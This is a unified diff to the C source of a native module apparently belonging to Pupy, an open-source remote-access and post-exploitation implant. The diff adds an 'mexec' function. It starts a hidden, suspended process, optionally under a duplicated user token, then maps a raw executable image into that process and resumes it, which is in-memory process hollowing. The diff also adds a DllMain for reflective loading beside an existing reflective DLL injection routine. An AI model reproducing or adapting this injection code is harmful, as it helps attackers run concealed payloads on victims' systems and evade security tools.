@@ -4,10 +4,19 @@
 */
 
 #include <windows.h>
+
+#ifdef _PUPY_DYNLOAD
+#include <Python.h>
+#else
 #include "Python-dynload.h"
+#endif
+
 #include "debug.h"
 #include "MyLoadLibrary.h"
 #include "base_inject.h"
+#include "in-mem-exe.c"
+
+#include "pupy_load.h"
 
 static char module_doc[] = DOC("Builtins utilities for pupy");
 
@@ -23,13 +32,9 @@ static PyObject *ExecError;
 
 #include "revision.h"
 
-#ifdef _PUPY_DLL
-#include "jni_on_load.c"
-#endif
-
+static HINSTANCE hAppInstance = NULL;
 static PyObject *Py_on_exit_session_callback = NULL;
-
-void * __JVM = NULL;
+static int is_shared = 0;
 
 void on_exit_session(void) {
     PyGILState_STATE gstate;
@@ -64,6 +69,129 @@ static PyObject *Py_get_arch(PyObject *self, PyObject *args)
         return Py_BuildValue("s", "x86");
 #endif
 }
+
+static PyObject *Py_mexec(PyObject *self, PyObject *args) {
+        PROCESS_INFORMATION pi;
+        STARTUPINFO si;
+        SECURITY_ATTRIBUTES saAttr = {
+                sizeof(SECURITY_ATTRIBUTES),
+                NULL,
+                TRUE
+        };
+
+        HANDLE g_hChildStd_IN_Rd = NULL;
+        HANDLE g_hChildStd_IN_Wr = NULL;
+        HANDLE g_hChildStd_OUT_Rd = NULL;
+        HANDLE g_hChildStd_OUT_Wr = NULL;
+        BOOL inherit = FALSE;
+        PyObject* py_redirect_stdio = NULL;
+        PyObject* py_hidden = NULL;
+        DWORD createFlags = CREATE_SUSPENDED|CREATE_NEW_CONSOLE;
+        char *cmd_line;
+        char *pe_raw_bytes;
+        int pe_raw_bytes_len;
+
+#ifdef _WIN64
+        long long dupHandleAddressPLL = 0;
+        void **dupHandleAddress = NULL;
+        HANDLE dupHandle = NULL;
+
+        if (!PyArg_ParseTuple(
+                        args,
+                        "ss#|OOK",
+                        &cmd_line, &pe_raw_bytes, &pe_raw_bytes_len,
+                        &py_redirect_stdio, &py_hidden, &dupHandleAddressPLL))
+                // the address of the handle is directly passed with ctypes
+                return NULL;
+
+        dupHandleAddress = (void **) ((DWORD_PTR) dupHandleAddressPLL);
+#else
+        PVOID dupHandleAddress = NULL;
+        HANDLE dupHandle = NULL;
+
+        if (!PyArg_ParseTuple(
+                        args,
+                        "ss#|OOI",
+                        &cmd_line, &pe_raw_bytes, &pe_raw_bytes_len,
+                        &py_redirect_stdio, &py_hidden, &dupHandleAddress))
+                // the address of the handle is directly passed with ctypes
+                return NULL;
+#endif
+
+        memset(&si,0,sizeof(STARTUPINFO));
+        memset(&pi,0,sizeof(PROCESS_INFORMATION));
+        si.cb = sizeof(STARTUPINFO);
+
+        if(py_hidden && PyObject_IsTrue(py_hidden)){
+                si.dwFlags |= STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_HIDE;
+                createFlags |= CREATE_NO_WINDOW;
+        }
+
+        if (!py_redirect_stdio || PyObject_IsTrue(py_redirect_stdio)) {
+                if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
+                        return PyErr_Format(PyExc_Exception, "Error in CreatePipe (IN): Errno %d", GetLastError());
+                }
+
+                if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
+                        CloseHandle(g_hChildStd_IN_Rd);
+                        CloseHandle(g_hChildStd_IN_Wr);
+                        return PyErr_Format(PyExc_Exception, "Error in CreatePipe (OUT): Errno %d", GetLastError());
+                }
+
+                si.hStdInput  = g_hChildStd_IN_Rd;
+                si.hStdOutput = g_hChildStd_OUT_Wr;
+                si.hStdError  = g_hChildStd_OUT_Wr;
+                si.dwFlags   |= STARTF_USESTDHANDLES;
+                inherit=TRUE;
+        }
+
+        if (!dupHandleAddress) {
+                if(!CreateProcess(NULL, cmd_line, &saAttr, NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
+                        CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
+                        CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+
+                        return PyErr_Format(PyExc_Exception, "Error in CreateProcess: Errno %d", GetLastError());
+                }
+
+        } else {
+                dupHandle=(HANDLE) dupHandleAddress;
+                if (!CreateProcessAsUser(dupHandle, NULL, cmd_line, &saAttr,
+                                                                 NULL, inherit, createFlags, NULL, NULL, &si, &pi)) {
+                        CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
+                        CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+
+                        return PyErr_Format(
+                                PyExc_Exception, "Error in CreateProcess: Errno %d dupHandle %x", GetLastError(),
+                                dupHandle
+                        );
+                }
+        }
+
+        CloseHandle(g_hChildStd_IN_Rd);
+        CloseHandle(g_hChildStd_OUT_Wr);
+
+        if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, pe_raw_bytes)) {
+                TerminateProcess(pi.hProcess, 1);
+                CloseHandle(pi.hProcess);
+                CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
+                CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+                return PyErr_Format(PyExc_Exception, "Error in MapNewExecutableRegionInProcess: Errno %d", GetLastError());
+        }
+
+        if (ResumeThread(pi.hThread) == (DWORD)-1) {
+                TerminateProcess(pi.hProcess, 1);
+                CloseHandle(pi.hProcess);
+                CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
+                CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);
+                return PyErr_Format(PyExc_Exception, "Error in ResumeThread: Errno %d", GetLastError());
+        }
+
+        CloseHandle(pi.hThread);
+
+        return Py_BuildValue("(III)", pi.hProcess, g_hChildStd_IN_Wr, g_hChildStd_OUT_Rd);
+}
+
 
 static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
 {
@@ -114,11 +242,15 @@ static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
 
 static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
 {
-#ifdef _PUPY_DLL
-        return PyBool_FromLong(1);
-#else
-        return PyBool_FromLong(0);
-#endif
+        return PyBool_FromLong(is_shared);
+}
+
+static PyObject *Py_set_is_shared_object(PyObject *self, PyObject *arg0)
+{
+        if (!is_shared && PyObject_IsTrue(arg0))
+                is_shared = 1;
+
+        return PyBool_FromLong(is_shared);
 }
 
 static PyObject *
@@ -181,8 +313,11 @@ import_module(PyObject *self, PyObject *args)
 
 static PyMethodDef methods[] = {
         { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
+        { "_set_shared", Py_set_is_shared_object, METH_NOARGS, DOC("") },
         { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
-        { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, DOC("reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure") },
+        { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS,
+         DOC("reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure") },
+        { "mexec", Py_mexec, METH_VARARGS|METH_KEYWORDS, DOC("mexec(cmdline, raw_pe, redirected_stdio=True, hidden=True)") },
         { "import_module", import_module, METH_VARARGS,
           "import_module(data, size, initfuncname, path) -> module" },
         { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
@@ -192,12 +327,11 @@ static PyMethodDef methods[] = {
         { NULL, NULL },         /* Sentinel */
 };
 
-DL_EXPORT(void)
-init_pupy(void)
+BOOL init_pupy(void)
 {
         PyObject *pupy = Py_InitModule3("_pupy", methods, module_doc);
         if (!pupy) {
-                return;
+                return FALSE;
         }
 
         PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
@@ -205,7 +339,51 @@ init_pupy(void)
         Py_INCREF(ExecError);
         PyModule_AddObject(pupy, "error", ExecError);
 
-#ifdef _PUPY_DLL
-        setup_jvm_class();
-#endif
+        return TRUE;
 }
+
+#ifdef _PUPY_DYNLOAD
+BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
+{
+    DWORD threadId;
+    BOOL bReturnValue = TRUE;
+
+    dprint("Call DllMain (_pupy) %d/%p\n", dwReason, lpReserved);
+
+    switch( dwReason )
+    {
+        case DLL_QUERY_HMODULE:
+            if( lpReserved != NULL )
+                *(HMODULE *)lpReserved = hAppInstance;
+        break;
+
+        case DLL_THREAD_ATTACH:
+            break;
+
+        case DLL_PROCESS_ATTACH:
+            hAppInstance = hinstDLL;
+            if (lpReserved > 0xFFFF) {
+                _pupy_pyd_args_t *args =
+                        (_pupy_pyd_args_t*) lpReserved;
+
+                if (args->pvMemoryLibraries) {
+                        MySetLibraries(args->pvMemoryLibraries);
+                }
+
+                args->cbExit = on_exit_session;
+                args->blInitialized = TRUE;
+            }
+            return init_pupy();
+
+        case DLL_THREAD_DETACH:
+            break;
+
+        case DLL_PROCESS_DETACH:
+            dprint("Should not happen?\n");
+            return FALSE;
+    }
+
+    dprint("Call DllMain - completed\n");
+    return bReturnValue;
+}
+#endif
